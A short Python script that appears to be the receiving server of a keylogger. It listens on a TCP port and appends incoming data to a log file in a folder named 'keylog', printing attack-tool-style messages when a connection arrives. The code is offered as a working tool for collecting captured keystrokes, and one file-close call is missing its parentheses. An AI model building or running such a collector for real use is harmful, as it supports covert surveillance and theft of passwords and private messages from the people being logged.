#!/usr/bin/python

import socket
import os

HOST_NAME = "192.168.88.128"
PORT_NUMBER = 8080
PATH = "/home/zevran/Documents/keylog"

def createFolders():
	if(not(os.path.exists(PATH))):
		os.mkdir(PATH)
	os.chdir(PATH)

def connecting():
	try:
		s = socket.socket()		
		s.bind((HOST_NAME,PORT_NUMBER))	
		print('Listening...')
		s.listen(1)			
		conn , addr = s.accept()	
		print('[+] We got a conection from ', addr)
		f = open("log.txt","a+")
		i = 0

		while True:				
			recvData = conn.recv(1024).decode('utf-8', errors="replace")
			i = i + 1
			f.write(recvData + "\n")
			if i == 10:
				f.close
				f = open("log.txt","a+")
				i = 0

	except KeyboardInterrupt:
		print('[!] Server is terminated')
		return 1

def main():
	createFolders()
	while True:
		if connecting() == 1:
			break
main()